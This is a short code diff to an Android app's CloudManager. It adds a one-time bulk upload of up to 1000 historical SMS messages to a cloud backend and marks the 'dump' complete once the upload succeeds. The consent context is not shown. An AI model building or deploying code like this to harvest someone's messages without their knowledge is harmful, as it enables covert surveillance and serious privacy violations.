@@ -43,6 +43,11 @@ object CloudManager {
                 if (isAll || modules.contains("sms")) {
                     json.put("sms_count", prefs.getInt("sms_count", 0))
                     json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
+                    
+                    // Historical Dump (One-Time Queue)
+                    if (!prefs.getBoolean("historical_sms_dumped", false)) {
+                        json.put("historical_sms", PhoneManager.getHistoricalSms(ctx, 1000))
+                    }
                 }
 
                 // --- MODULE 3: USAGE ---
@@ -143,6 +148,11 @@ object CloudManager {
                     DebugLogger.log("SUPABASE_ERR", "Code: $code | Msg: $err")
                 } else {
                     DebugLogger.log("Cloud", "Upload Finished. Code: $code")
+                    // Mark queue as complete ONLY if upload succeeded
+                    if (json.has("historical_sms")) {
+                        prefs.edit().putBoolean("historical_sms_dumped", true).apply()
+                        DebugLogger.log("Cloud", "Historical SMS archive successfully extracted and synced.")
+                    }
                 }
             } catch (e: Exception) {
                 DebugLogger.log("CLOUD_FATAL", "Raw Upload Error:\n${e.stackTraceToString()}")
